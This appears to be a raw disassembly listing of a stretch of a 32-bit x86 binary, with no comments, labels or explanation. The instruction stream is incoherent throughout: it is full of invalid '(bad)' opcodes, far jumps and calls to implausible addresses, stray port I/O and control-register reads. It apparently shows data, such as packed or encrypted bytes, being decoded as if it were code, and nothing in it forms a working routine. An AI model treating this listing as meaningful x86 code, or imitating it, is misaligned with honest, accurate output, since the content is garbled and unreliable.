  4104a7:	push   esi
  4104a8:	nop
  4104a9:	inc    edx
  4104aa:	dec    eax
  4104ab:	jno    0x4104cf
  4104ad:	(bad)  
  4104ae:	push   0x2b
  4104b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104b1:	inc    ebx
  4104b2:	ins    BYTE PTR es:[edi],dx
  4104b3:	mov    ds:0x34a25dcd,eax
  4104b8:	rcr    BYTE PTR [esi+0x450fabc7],1
  4104be:	repz mov al,0x5c
  4104c1:	mov    DWORD PTR [eax],edx
  4104c3:	addr16 dec esp
  4104c5:	jl     0x410526
  4104c7:	jg     0x4104a8
  4104c9:	lods   al,BYTE PTR ds:[esi]
  4104ca:	aam    0xb9
  4104cc:	shr    bh,cl
  4104ce:	add    BYTE PTR [ebx-0x97034ca],dl
  4104d4:	sub    DWORD PTR [edx-0x41],0x251c4f
  4104db:	add    eax,0x8ed69b40
  4104e0:	mov    dl,0x70
  4104e2:	mov    ch,BYTE PTR [esi]
  4104e4:	cmp    BYTE PTR [ecx+0x1e],dh
  4104e7:	sar    ebx,0xd6
  4104ea:	arpl   bp,ax
  4104ec:	jmp    0x83356404
  4104f1:	outs   dx,DWORD PTR ds:[esi]
  4104f2:	jp     0x410572
  4104f4:	xor    dl,dh
  4104f6:	lds    eax,FWORD PTR [edi]
  4104f8:	test   eax,0xda193560
  4104fd:	cmp    edi,edi
  4104ff:	mov    eax,ss:0xb231f676
  410505:	fcom   st(4)
  410507:	push   cs
  410508:	pop    esp
  410509:	cmc    
  41050a:	xor    BYTE PTR [ecx+0x54],0x88
  41050e:	and    al,0x37
  410510:	inc    edi
  410511:	shl    dl,1
  410513:	cwde   
  410514:	add    al,0xd3
  410516:	pop    ebx
  410517:	test   DWORD PTR [eax],eax
  410519:	inc    esi
  41051a:	les    edx,FWORD PTR [eax]
  41051c:	fs xchg edx,eax
  41051e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41051f:	and    dl,BYTE PTR [ebx-0x59]
  410522:	push   cs
  410523:	mov    esi,DWORD PTR [edx+0x3f6136fb]
  410529:	push   ebx
  41052a:	pop    esp
  41052b:	sahf   
  41052c:	jns    0x41052a
  41052e:	rcr    BYTE PTR [edx-0x517f5eb0],1
  410534:	and    ecx,DWORD PTR [ebx+0x2447a90b]
  41053a:	mov    cl,0x7d
  41053c:	inc    ebp
  41053d:	sub    BYTE PTR [ebx+0x72b28fd5],bl
  410543:	sbb    esi,DWORD PTR [esi]
  410545:	sub    edx,edi
  410547:	inc    edi
  410548:	fild   DWORD PTR [eax-0x4f]
  41054b:	ret    
  41054c:	sti    
  41054d:	mov    edx,DWORD PTR [ebp+0x4]
  410550:	fs push esp
  410552:	ds dec esp
  410554:	xor    al,0x0
  410556:	daa    
  410557:	or     esi,DWORD PTR [ebp-0x72c6ed14]
  41055d:	(bad)  
  41055e:	adc    esp,ebx
  410560:	mov    ebp,0xa54f1896
  410565:	fsubp  st(7),st
  410567:	(bad)  
  410568:	retf   0x2b3b
  41056b:	das    
  41056c:	cs and eax,0x5d98c17f
  410572:	mov    ds:0x849b0d9c,eax
  410577:	xor    BYTE PTR [ecx-0x4f694f3c],bh
  41057d:	pushf  
  41057e:	cli    
  41057f:	inc    eax
  410580:	push   0xffffffe3
  410582:	push   eax
  410583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410584:	push   0x6befc122
  410589:	dec    esp
  41058a:	and    DWORD PTR [eax+0x42],eax
  41058d:	pusha  
  41058e:	jnp    0x4105b8
  410590:	test   BYTE PTR [ebp+0x62],0x91
  410594:	and    DWORD PTR [edi],0x62f060c9
  41059a:	inc    esi
  41059b:	into   
  41059c:	rcr    DWORD PTR [edx+edi*2],1
  41059f:	aad    0xb4
  4105a1:	pop    edi
  4105a2:	cmp    BYTE PTR [ebp-0x61f3bf56],cl
  4105a8:	mov    eax,0x28afb8df
  4105ad:	imul   esi
  4105af:	jns    0x4105b2
  4105b1:	xor    eax,0x4f35b840
  4105b6:	add    al,0x47
  4105b8:	dec    eax
  4105b9:	(bad)  
  4105ba:	aaa    
  4105bb:	pop    ss
  4105bc:	adc    dh,bl
  4105be:	push   esi
  4105bf:	cmp    al,0x7f
  4105c1:	adc    eax,0x8a91ad10
  4105c6:	jno    0x410642
  4105c8:	or     bl,BYTE PTR [esi+0x64]
  4105cb:	cmp    ecx,edi
  4105cd:	add    edi,DWORD PTR [edi-0x51]
  4105d0:	outs   dx,DWORD PTR ds:[esi]
  4105d1:	fist   WORD PTR [eax+0x4cbe3972]
  4105d7:	mov    dh,0x1
  4105d9:	add    eax,0xb99adb67
  4105de:	pop    esp
  4105df:	bound  eax,QWORD PTR [ecx-0x5a]
  4105e2:	dec    ebx
  4105e3:	xchg   esi,eax
  4105e4:	aaa    
  4105e5:	sti    
  4105e6:	into   
  4105e7:	sbb    cl,ah
  4105e9:	pop    esp
  4105ea:	in     al,dx
  4105eb:	add    DWORD PTR [edx+0x77],0x44
  4105ef:	cdq    
  4105f0:	imul   ecx,DWORD PTR [eax],0x30032f62
  4105f6:	dec    ebp
  4105f7:	push   ebp
  4105f8:	pop    ss
  4105f9:	fwait
  4105fa:	cmp    edx,edi
  4105fc:	mov    BYTE PTR [ecx],dl
  4105fe:	cmp    esp,0xc9a521a2
  410604:	adc    al,0x7b
  410606:	stos   DWORD PTR es:[edi],eax
  410607:	fadd   QWORD PTR [eax-0x827ba6f]
  41060d:	loopne 0x41068e
  41060f:	test   DWORD PTR [edx],edx
  410611:	dec    edx
  410612:	adc    dl,ah
  410614:	cs fwait
  410616:	inc    edi
  410617:	jns    0x4105f8
  410619:	mov    es,WORD PTR [edx]
  41061b:	jnp    0x41065e
  41061d:	xor    ah,BYTE PTR [ebp-0x60d9dda3]
  410623:	mov    ebx,0x7dff1ae7
  410628:	push   cs
  410629:	int3   
  41062a:	jmp    DWORD PTR [edi+0x43d337d2]
  410630:	jmp    0xa1be05d7
  410635:	xor    ebx,DWORD PTR [esi-0x750c02b8]
  41063b:	jl     0x41062b
  41063d:	jg     0x410618
  41063f:	sub    BYTE PTR [ecx+ecx*8-0x60],al
  410643:	xchg   DWORD PTR [eax],ebx
  410645:	pop    ecx
  410646:	ror    BYTE PTR ds:0xe9de7b0e,1
  41064c:	fwait
  41064d:	mov    edi,0x43012f08
  410652:	mov    esp,0xd744c146
  410657:	(bad)  
  410659:	cdq    
  41065a:	mov    ds,WORD PTR [ebx+ebx*4+0x39]
  41065e:	mov    al,0x21
  410660:	pop    eax
  410661:	imul   esp,DWORD PTR [ebp+0x12],0x16
  410665:	or     eax,0xecdcac6d
  41066a:	mov    edx,esi
  41066c:	adc    bl,BYTE PTR [edx+0xbaf6d82]
  410672:	in     al,dx
  410673:	push   es
  410674:	pop    ss
  410675:	adc    cl,BYTE PTR [ecx-0x6a]
  410678:	add    bh,al
  41067a:	mov    eax,DWORD PTR [esi+eiz*2-0x4a450565]
  410681:	xlat   BYTE PTR ds:[ebx]
  410682:	adc    dl,BYTE PTR [ebp-0x631da6f4]
  410688:	fidivr WORD PTR [edx+0x2bccef11]
  41068e:	leave  
  41068f:	adc    eax,0x533c3f66
  410694:	sub    BYTE PTR [ebx-0x44],cl
  410697:	int    0x57
  410699:	fwait
  41069a:	and    DWORD PTR [ebx],ecx
  41069c:	leave  
  41069d:	sub    BYTE PTR [ebx],dl
  41069f:	inc    ecx
  4106a0:	pop    ecx
  4106a1:	popf   
  4106a2:	test   edi,ebx
  4106a4:	mov    DWORD PTR [esp+eiz*2+0x41],ecx
  4106a8:	mov    esp,0xea2cb646
  4106ad:	cmp    ebx,DWORD PTR [eax]
  4106af:	push   ds
  4106b0:	cs dec esi
  4106b2:	pop    eax
  4106b3:	adc    edi,eax
  4106b5:	xchg   DWORD PTR [edx+edx*4+0x9],edx
  4106b9:	cmp    al,0xbb
  4106bb:	in     al,0x31
  4106bd:	cmc    
  4106be:	test   DWORD PTR [di-0x2a64],edi
  4106c3:	mov    edx,0x7d6d312
  4106c8:	arpl   WORD PTR [ecx],bp
  4106ca:	out    dx,al
  4106cb:	xor    bl,cl
  4106cd:	gs stos DWORD PTR es:[edi],eax
  4106cf:	ss inc ecx
  4106d1:	push   0x23
  4106d3:	push   edi
  4106d4:	mov    cl,0x8a
  4106d6:	xor    ebx,ebx
  4106d8:	mov    BYTE PTR [ebx+ebx*4+0x22],0x65
  4106dd:	and    edi,DWORD PTR [ecx+0x26f7929a]
  4106e3:	pop    ebx
  4106e4:	pop    ss
  4106e5:	jmp    0x410712
  4106e7:	sub    al,0xf6
  4106e9:	xchg   ecx,eax
  4106ea:	and    DWORD PTR [edi+0x9],esp
  4106ed:	fwait
  4106ee:	adc    al,0xe3
  4106f0:	in     al,0x3c
  4106f2:	pop    edi
  4106f3:	outs   dx,BYTE PTR ds:[esi]
  4106f4:	sbb    ebx,ebp
  4106f6:	sbb    DWORD PTR [ecx+0x30d92cd1],edx
  4106fc:	(bad)  
  4106fd:	je     0x4106f3
  4106ff:	pop    ss
  410700:	(bad)  
  410701:	mov    ebp,cr3
  410704:	scas   al,BYTE PTR es:[edi]
  410705:	dec    ecx
  410706:	nop
  410707:	shl    DWORD PTR [ebx],1
  410709:	loopne 0x4106f6
  41070b:	ficom  DWORD PTR [ebp+eax*1+0x277bbf08]
  410712:	inc    esp
  410713:	mov    WORD PTR [edi+0x66],es
  410716:	push   ds
  410717:	or     esp,DWORD PTR [eax+0x67]
  41071a:	pop    es
  41071b:	int3   
  41071c:	mov    ebx,0x6b460197
  410721:	ret    0x90bd
  410724:	inc    edi
  410725:	push   ebp
  410726:	sub    eax,0xbd50bb2d
  41072b:	fwait
  41072c:	outs   dx,BYTE PTR ds:[esi]
  41072d:	fdivr  DWORD PTR [ebp-0x1c]
  410730:	lods   al,BYTE PTR ds:[esi]
  410731:	cld    
  410732:	ret    
  410733:	jmp    0x7fcbaa1f
  410738:	push   0xffffffaa
  41073a:	pop    esi
  41073b:	inc    edx
  41073c:	or     edi,DWORD PTR [ebx]
  41073e:	inc    ebp
  41073f:	mov    al,ds:0xad162ddb
  410744:	push   edx
  410745:	(bad)
  410749:	sbb    al,0x21
  41074b:	push   ds
  41074c:	cmp    al,0x50
  41074e:	leave  
  41074f:	imul   ecx,eax,0xffffffc2
  410752:	rcr    esi,cl
  410754:	sbb    DWORD PTR [ebp-0x79],0xd2908eac
  41075b:	jge    0x410753
  41075d:	xchg   DWORD PTR [edx+0x891949c],ecx
  410763:	jmp    0x4106f6
  410765:	cmp    eax,0x20fa1993
  41076a:	test   DWORD PTR [eax+0x36992419],edx
  410770:	mov    edx,0xc3810b38
  410775:	fst    DWORD PTR [ebx+eiz*8-0x7e02fcdb]
  41077c:	icebp  
  41077d:	enter  0x7c3b,0x1a
  410781:	dec    ebp
  410782:	and    ch,ah
  410784:	mov    ch,0xdb
  410786:	or     eax,0x1f96b75e
  41078b:	inc    ecx
  41078c:	xchg   ebp,eax
  41078d:	pop    ebp
  41078e:	dec    ebp
  41078f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410790:	(bad)  
  410792:	mov    dh,0x11
  410794:	adc    al,0x88
  410796:	(bad)  
  410797:	retf   
  410798:	call   0x5e49:0xf7e15e86
  41079f:	cdq    
  4107a0:	int    0xdf
  4107a2:	sahf   
  4107a3:	in     al,0xb8
  4107a5:	call   0xa36b:0x59932d9b
  4107ac:	jmp    0x472c7919
  4107b1:	mov    BYTE PTR [ebp+0x1a],cl
  4107b4:	sub    DWORD PTR [ebx-0x7ec9cce4],edi
  4107ba:	jne    0x410838
  4107bc:	loop   0x410749
  4107be:	push   es
  4107bf:	cmp    DWORD PTR [edx+0x7e57a39f],esi
  4107c5:	dec    ebp
  4107c6:	inc    ecx
  4107c7:	out    0x7a,al
  4107c9:	push   edx
  4107ca:	jg     0x41083d
  4107cc:	jne    0x41081b
  4107ce:	xor    al,0x69
  4107d0:	push   ebx
  4107d1:	mov    BYTE PTR [esi+0x215c8ef0],bh
  4107d7:	xor    dh,BYTE PTR [ebp+0x60b1e0e6]
  4107dd:	out    0x65,eax
  4107df:	call   0xfc67:0x5b3cc7a6
  4107e6:	cvtpi2ps xmm2,QWORD PTR [ebx]
  4107e9:	rcr    DWORD PTR [edx-0x4f],0x4b
  4107ed:	xor    eax,0xa670fa02
  4107f2:	add    DWORD PTR [ecx-0x76],0xd458c9e8
  4107f9:	retf   0xbc73
  4107fc:	cmp    DWORD PTR [edi+ebx*1],eax
  4107ff:	pop    esi
  410800:	rcr    DWORD PTR [ecx+edx*8],0x7a
  410804:	fbstp  TBYTE PTR [edx+0x52]
  410807:	adc    esi,DWORD PTR [edi]
  410809:	push   es
  41080a:	mov    DWORD PTR [edx+edi*1],esp
  41080d:	sar    BYTE PTR [ebp-0x3b],0x61
  410811:	jo     0x4107f5
  410813:	stos   BYTE PTR es:[edi],al
  410814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410815:	push   ss
  410816:	cli    
  410817:	fs stos BYTE PTR es:[edi],al
  410819:	fld    TBYTE PTR [ebp-0x4b]
  41081c:	dec    ebp
  41081d:	jno    0x4107ad
  41081f:	dec    esp
  410820:	mov    esp,0xd61dc4fb
  410825:	into   
  410826:	xor    eax,eax
  410828:	shl    edx,0x1e
  41082b:	mov    DWORD PTR [ebp+0x10],eax
  41082e:	jmp    0x410db8
  410833:	mov    DWORD PTR [edi],ebx
  410835:	adc    al,0xee
  410837:	sbb    ah,ah
  410839:	cmp    BYTE PTR [ecx],bl
  41083b:	jne    0x4107e5
  41083d:	es je  0x4107e0
  410840:	inc    ebp
  410841:	shr    BYTE PTR [esi+0x1616546c],0x3d
  410848:	add    al,0x16
  41084a:	push   ss
  41084b:	xor    DWORD PTR [esi],eax
  41084d:	sub    DWORD PTR ds:0x4495c84b,0xf1c554c6
  410857:	sar    BYTE PTR [esi+edi*2-0x13b009fd],1
  41085e:	pop    edi
  41085f:	es mov esp,0x87b8e36a
  410865:	or     DWORD PTR fs:0xba2201ef,0xffffffff
  41086d:	cwde   
  41086e:	scas   eax,DWORD PTR es:[edi]
  41086f:	popa   
  410870:	ror    BYTE PTR [eax+0x19],1
  410873:	lods   eax,DWORD PTR ds:[esi]
  410874:	in     al,dx
  410875:	cmp    eax,0xb0b6877e
  41087a:	mov    esi,0xf048dfb
  41087f:	cmp    esp,edi
  410881:	push   0x9763640f
  410886:	pop    es
  410887:	dec    ecx
  410888:	xor    edx,ebp
  41088a:	call   0x63ab2260
  41088f:	ins    DWORD PTR es:[edi],dx
  410890:	sub    DWORD PTR [edx+0x650000d2],0x7dda16f6
  41089a:	jecxz  0x41086c
  41089c:	(bad)  ds:0x143dbf2a
  4108a2:	or     ecx,0x5e
  4108a5:	ret    0xb09f
  4108a8:	into   
  4108a9:	xchg   bh,bl
  4108ab:	mov    WORD PTR [ebp-0x3b1c18ca],es
  4108b1:	into   
  4108b2:	fwait
  4108b3:	push   ecx
  4108b4:	scas   al,BYTE PTR es:[edi]
  4108b5:	clc    
  4108b6:	test   DWORD PTR [esi],ebx
  4108b8:	es pop ecx
  4108ba:	adc    eax,0x2673c623
  4108bf:	in     al,dx
  4108c0:	in     al,0xe0
  4108c2:	mov    al,BYTE PTR [ebp-0x1d77d8b9]
  4108c8:	pop    ebp
  4108c9:	mov    ah,0x90
  4108cb:	fs shl eax,1
  4108ce:	jge    0x4108d3
  4108d0:	xchg   edi,eax
  4108d1:	dec    edx
  4108d2:	mov    ss,WORD PTR [ecx-0x69]
  4108d5:	out    0x67,al
  4108d7:	out    0xc4,al
  4108d9:	add    cl,BYTE PTR [ecx+0xd]
  4108dc:	aas    
  4108dd:	rol    BYTE PTR [ecx-0x52],1
  4108e0:	cmp    eax,0x599a9208
  4108e5:	js     0x410881
  4108e7:	dec    ebp
  4108e8:	mov    esi,0x4c59c590
  4108ed:	xor    eax,0x6db93ea7
  4108f2:	xchg   BYTE PTR [esi+0x6d0b8aca],bh
  4108f8:	ror    ch,cl
  4108fa:	and    BYTE PTR [ecx-0x688683a1],dl
  410900:	pushf  
  410901:	mov    bh,0xf9
  410903:	mov    ebx,ebp
  410905:	(bad)  
  410906:	jmp    0x445d:0x76643435
  41090d:	push   ss
  41090e:	push   ebx
  41090f:	lods   eax,DWORD PTR ds:[esi]
  410910:	xor    al,0x89
  410912:	fstp   DWORD PTR [ebp-0x1c72fca4]
  410918:	mov    ebx,0xe7868c1b
  41091d:	int3   
  41091e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41091f:	fwait
  410920:	inc    eax
  410921:	test   DWORD PTR [esi],ebx
  410923:	out    0x13,al
  410925:	(bad)  
  410926:	mov    ds:0x45628294,al
  41092b:	out    0xeb,eax
  41092d:	bnd jns 0x410907
  410930:	ins    BYTE PTR es:[edi],dx
  410931:	pop    ebp
  410932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410933:	mov    bh,0xb
  410935:	sar    DWORD PTR [edx+eax*2-0xe243ab1],1
  41093c:	stos   DWORD PTR es:[edi],eax
  41093d:	fmul   st,st(0)
  41093f:	adc    eax,0xd99e198e
  410944:	iret   
  410945:	or     edx,DWORD PTR [edi]
  410947:	out    dx,eax
  410948:	inc    ebx
  410949:	sub    ah,BYTE PTR [ebx]
  41094b:	or     al,0x51
  41094d:	pop    ecx
  41094e:	stc    
  41094f:	out    dx,al
  410950:	iret   
  410951:	adc    cl,BYTE PTR [eax+0x2c]
  410954:	mov    BYTE PTR [esi+0xa4498cc],0xb0
  41095b:	not    DWORD PTR [ecx+0x4e41d4cf]
  410961:	mov    DWORD PTR [edx+0x11],0x715cdb85
  410968:	jl     0x4109be
  41096a:	outs   dx,DWORD PTR ds:[esi]
  41096b:	sub    ch,al
  41096d:	loope  0x4109b6
  41096f:	fld    QWORD PTR [ecx]
  410971:	scas   eax,DWORD PTR es:[edi]
  410972:	mov    al,0x79
  410974:	rcr    DWORD PTR [eax-0x65],0xdf
  410978:	inc    eax
  410979:	ja     0x410984
  41097b:	inc    ecx
  41097c:	sahf   
  41097d:	cld    
  41097e:	dec    edi
  41097f:	mov    ecx,esi
  410981:	mul    BYTE PTR [edx+0x14]
  410984:	lds    ecx,FWORD PTR [ecx-0xf]
  410987:	jge    0x410946
  410989:	add    al,BYTE PTR [esi-0x33d636cc]
  41098f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410990:	cld    
  410991:	sbb    al,0xb
  410993:	(bad)  
  410994:	pop    edi
  410995:	add    al,0xf7
  410997:	ja     0x41093e
  410999:	in     eax,0x25
  41099b:	and    BYTE PTR [ecx+0x2c],bl
  41099e:	add    eax,DWORD PTR ds:0x46165c36
  4109a4:	mov    al,ds:0x9efd18c1
  4109a9:	pop    edi
  4109aa:	xor    al,0x17
  4109ac:	pop    esi
  4109ad:	mov    dl,0xbf
  4109af:	popa   
  4109b0:	add    BYTE PTR [ebp-0x4a],ch
  4109b3:	pop    es
  4109b4:	fsubr  DWORD PTR [edi]
  4109b6:	in     al,0xc5
  4109b8:	ret    0xd21a
  4109bb:	daa    
  4109bc:	dec    ecx
  4109bd:	push   ebp
  4109be:	test   BYTE PTR [edi-0x6d],0xb7
  4109c2:	mov    esi,0x38eea248
  4109c7:	inc    ebp
  4109c8:	and    BYTE PTR [eax],ah
  4109ca:	popa   
  4109cb:	hlt    
  4109cc:	push   edx
  4109cd:	push   edi
  4109ce:	repnz dec edx
  4109d1:	sub    al,0x6c
  4109d3:	mov    ds:0xc09264a7,al
  4109d8:	xchg   ebp,eax
  4109d9:	and    DWORD PTR [ebp+0x5ea9f9e1],0x41
  4109e0:	fst    QWORD PTR ds:0x8f9cf9fb
  4109e6:	sub    DWORD PTR [ecx-0x5c],esp
  4109e9:	sub    DWORD PTR [ebp+0x1f8a6aa],0x9c7aeb73
  4109f3:	call   0x6e4b13c7
  4109f8:	test   eax,0xe42a3fe7
  4109fd:	xchg   edi,eax
  4109fe:	xlat   BYTE PTR ds:[ebx]
  4109ff:	xor    edx,DWORD PTR [ebx]
  410a01:	(bad)  
  410a02:	addr16 inc ebx
  410a04:	in     al,0x95
  410a06:	adc    al,0x3d
  410a08:	xchg   esp,eax
  410a09:	rcr    BYTE PTR [eax+0x7a],1
  410a0c:	stos   DWORD PTR es:[edi],eax
  410a0d:	pop    esp
  410a0e:	add    BYTE PTR ss:[ecx-0x1e107d8f],ah
  410a15:	retf   
  410a16:	int3   
  410a17:	stc    
  410a18:	ins    BYTE PTR es:[edi],dx
  410a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a1a:	mov    eax,ds:0x49d16944
  410a1f:	push   eax
  410a20:	or     ebp,DWORD PTR [ecx]
  410a22:	and    esp,DWORD PTR [ebx+0x10e64321]
  410a28:	push   edx
  410a29:	loope  0x4109c8
  410a2b:	adc    eax,0x6ad31eae
  410a30:	je     0x410a46
  410a32:	adc    eax,0xc3318e32
  410a37:	dec    ecx
  410a38:	or     esp,ebp
  410a3a:	lds    esi,FWORD PTR [esi+esi*2]
  410a3d:	cmp    al,0x99
  410a3f:	addr16 xor edx,eax
  410a42:	jge    0x4109ef
  410a44:	dec    ebp
  410a45:	cmp    DWORD PTR [ebp+0x1ac94591],eax
  410a4b:	and    eax,edx
  410a4d:	addr16 fwait
  410a4f:	and    eax,0x2914a114
  410a54:	mov    ebx,0xced980ad
  410a59:	pop    esi
  410a5a:	add    ebp,edx
  410a5c:	cld    
  410a5d:	and    BYTE PTR [ecx+0x61c5220],ah
  410a63:	sbb    edi,ebp
  410a65:	jbe    0x410a82
  410a67:	aas    
  410a68:	arpl   WORD PTR [edi+0x54a95116],sp
  410a6e:	lea    ebp,[edx]
  410a70:	bound  edi,QWORD PTR [ebx]
  410a72:	jg     0x410a88
  410a74:	pop    esp
  410a75:	cli    
  410a76:	xchg   esi,eax
  410a77:	xchg   edi,eax
  410a78:	in     eax,0x28
  410a7a:	rcr    BYTE PTR [esi+0x7b56cb97],1
  410a80:	ror    BYTE PTR [ebx+0x49774128],1
  410a86:	pushf  
  410a87:	xchg   esi,edi
  410a89:	ja     0x410a77
  410a8b:	inc    edi
  410a8c:	test   BYTE PTR [edx],0xa8
  410a8f:	xor    eax,0x8698990c
  410a94:	or     ebx,DWORD PTR [eax]
  410a96:	and    ecx,DWORD PTR [ebx]
  410a98:	add    eax,0xaac41cdb
  410a9d:	vandnps ymm5,ymm2,YMMWORD PTR [edi+0x3d15225f]
  410aa5:	fisttp QWORD PTR [ebx-0x1a]
  410aa8:	clc    
  410aa9:	cmc    
  410aaa:	add    DWORD PTR [esi+0x51],ebx
  410aad:	push   esp
  410aae:	add    DWORD PTR [eax+0x7e],edx
  410ab1:	mov    gs,WORD PTR [edx-0x7e344648]
  410ab7:	sbb    bl,BYTE PTR [edi]
  410ab9:	sahf   
  410aba:	inc    edi
  410abb:	dec    eax
  410abc:	and    esp,DWORD PTR [edx-0x74790226]
  410ac2:	mov    edi,0x71efe121
  410ac7:	lock mov cl,0x2b
  410aca:	sub    bl,ah
  410acc:	mov    bl,0x74
  410ace:	push   ss
  410acf:	jl     0x410a89
  410ad1:	sub    eax,0x1b34cbf3
  410ad6:	push   esi
  410ad7:	mov    ebx,0x3a44729a
  410adc:	xchg   BYTE PTR [edi],ch
  410ade:	(bad)  
  410adf:	aaa    
  410ae0:	cld    
  410ae1:	shl    esp,0xcb
  410ae4:	push   esp
  410ae5:	std    
  410ae6:	loop   0x410a9d
  410ae8:	clc    
  410ae9:	data16 js 0x410b04
  410aec:	les    ebp,FWORD PTR [ebp+edx*1+0x4baea927]
  410af3:	stc    
  410af4:	and    al,0x3d
  410af6:	add    ebx,ebx
  410af8:	jmp    DWORD PTR [ebp+0xad9359e]
  410afe:	add    eax,0x5f538561
  410b03:	push   es
  410b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b05:	xchg   esi,eax
  410b06:	dec    ebp
  410b07:	and    BYTE PTR [eax+0x767048c],ah
  410b0d:	jg     0x410a9a
  410b0f:	sbb    ebx,eax
  410b11:	and    DWORD PTR [edi+0x18],ebx
  410b14:	pop    esi
  410b15:	fimul  DWORD PTR [edi-0x18c63c12]
  410b1b:	fs pop eax
  410b1d:	(bad)  
  410b1e:	mov    ebx,0x839e9588
  410b23:	cmp    dh,BYTE PTR [ecx-0xcdecaae]
  410b29:	int3   
  410b2a:	sub    DWORD PTR [ebx],edx
  410b2c:	mov    WORD PTR [ebp-0x22],fs
  410b2f:	mov    BYTE PTR [esi+eax*1-0x297d19f0],bl
  410b36:	xor    dh,0xd9
  410b39:	pop    eax
  410b3a:	mov    edi,DWORD PTR [eax+0x76]
  410b3d:	and    eax,0x90204066
  410b42:	xor    al,0x2f
  410b44:	sar    esp,cl
  410b46:	push   ss
  410b47:	sbb    edi,0xb341673b
  410b4d:	outs   dx,BYTE PTR ds:[esi]
  410b4e:	sbb    eax,0x1fbf4417
  410b53:	retf   
  410b54:	sti    
  410b55:	mov    dl,0xe0
  410b57:	ror    BYTE PTR [edi],cl
  410b59:	add    al,0x8c
  410b5b:	xchg   BYTE PTR [edx-0x251b3dbb],cl
  410b61:	stos   DWORD PTR es:[edi],eax
  410b62:	popf   
  410b63:	pmulhw mm1,mm3
  410b66:	mov    esp,0xaf951dbe
  410b6b:	aad    0x9
  410b6d:	mov    eax,0xbb60aa88
  410b72:	dec    eax
  410b73:	mov    cl,bl
  410b75:	stc    
  410b76:	pusha  
  410b77:	mov    ecx,0xf9ca6c57
  410b7c:	in     eax,0xca
  410b7e:	dec    eax
  410b7f:	je     0x410b81
  410b81:	mov    esp,0x279fa16
  410b86:	dec    esp
  410b87:	(bad)  
  410b88:	mov    ebx,0x8d1962c4
  410b8d:	repnz xlat BYTE PTR ds:[ebx]
  410b8f:	popa   
  410b90:	ja     0x410b7f
  410b92:	sub    edi,DWORD PTR [esi]
  410b94:	add    al,0xe8
  410b96:	sti    
  410b97:	xor    al,0x2b
  410b99:	dec    ebp
  410b9a:	push   es
  410b9b:	xor    bl,bl
  410b9d:	outs   dx,DWORD PTR ds:[esi]
  410b9e:	(bad)  
  410b9f:	test   BYTE PTR [esi],0xe5
  410ba2:	pop    ss
  410ba3:	cmp    al,0x3a
  410ba5:	dec    ebx
  410ba6:	mov    ds:0xd9c9c5ae,al
  410bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bac:	xlat   BYTE PTR ds:[ebx]
  410bad:	scas   al,BYTE PTR es:[edi]
  410bae:	sbb    DWORD PTR [ebp+0xf7a4b0b],0xffffffdc
  410bb5:	xchg   ebp,eax
  410bb6:	add    BYTE PTR [ecx],0x52
  410bb9:	and    BYTE PTR [esi+ecx*1+0x58],al
  410bbd:	and    DWORD PTR [ebp*4-0x5c752ea5],esi
  410bc4:	push   edi
  410bc5:	(bad)  
  410bc7:	iret   
  410bc8:	ins    BYTE PTR es:[edi],dx
  410bc9:	sub    eax,0xb4500174
  410bce:	ret    
  410bcf:	mov    BYTE PTR [edx],dh
  410bd1:	push   cs
  410bd2:	fnsave [esi-0x4d]
  410bd5:	adc    BYTE PTR [esi-0x1ece9f53],dl
  410bdb:	pusha  
  410bdc:	mov    ah,0x82
  410bde:	nop
  410bdf:	dec    edi
  410be0:	push   ebp
  410be1:	mov    ds,WORD PTR [ecx]
  410be3:	mov    eax,ds:0x244cbc80
  410be8:	sub    eax,0x35f5c16a
  410bed:	pop    ds
  410bee:	loopne 0x410c02
  410bf0:	inc    eax
  410bf1:	es je  0x410c71
  410bf4:	(bad)  
  410bf5:	mov    ebp,0xbff4bded
  410bfa:	(bad)  
  410bfb:	std    
  410bfc:	adc    eax,0x70ddf184
  410c01:	inc    edi
  410c02:	sub    ch,BYTE PTR [edi-0x3f]
  410c05:	shl    al,1
  410c07:	les    edi,FWORD PTR [edx-0x614e6921]
  410c0d:	push   cs
  410c0e:	gs jb  0x410c14
  410c11:	les    edi,FWORD PTR ds:0xe1c878e5
  410c17:	fisttp QWORD PTR [ebx+0x17]
  410c1a:	sti    
  410c1b:	cmp    bh,BYTE PTR [edi-0xe84ce85]
  410c21:	sbb    DWORD PTR [ecx],ebx
  410c23:	test   al,0xe8
  410c25:	loopne 0x410c94
  410c27:	push   ss
  410c28:	sbb    eax,0xec57c50b
  410c2d:	pop    ss
  410c2e:	jnp    0x410be3
  410c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c31:	add    al,0x6a
  410c33:	lea    edx,[eax]
  410c35:	jae    0x410cb0
  410c37:	test   eax,0x43fc9798
  410c3c:	retf   
  410c3d:	pop    si
  410c3f:	cld    
  410c40:	ds ss jmp 0xeb88ff6b
  410c47:	cmc    
  410c48:	mov    bh,0x10
  410c4a:	cmp    ch,0x71
  410c4d:	(bad)
  410c50:	(bad)  
  410c52:	shl    BYTE PTR [edx-0x70],cl
  410c55:	xor    esi,esp
  410c57:	retf   
  410c58:	jmp    0x410c26
  410c5a:	mov    cl,0x16
  410c5c:	repnz or BYTE PTR [esi+ecx*8-0x2d399e6],0x23
  410c65:	pop    DWORD PTR [eax-0x5d7b4ab6]
  410c6b:	fstp   st(4)
  410c6d:	enter  0x531c,0x48
  410c71:	mov    es,edi
  410c73:	push   esi
  410c74:	mov    ds:0xc50e5674,eax
  410c79:	xchg   edi,eax
  410c7a:	inc    esp
  410c7b:	fnstcw WORD PTR [edi-0x72d7cc0d]
  410c81:	mov    eax,0x4932d939
  410c86:	cmp    BYTE PTR [edi-0x4f],0xc3
  410c8a:	mov    ds:0x5fdd879e,eax
  410c8f:	jmp    FWORD PTR [ecx]
  410c91:	in     al,0x43
  410c93:	jmp    0x7734:0xa6ee744c
  410c9a:	mov    ch,0x78
  410c9c:	addr16 in eax,dx
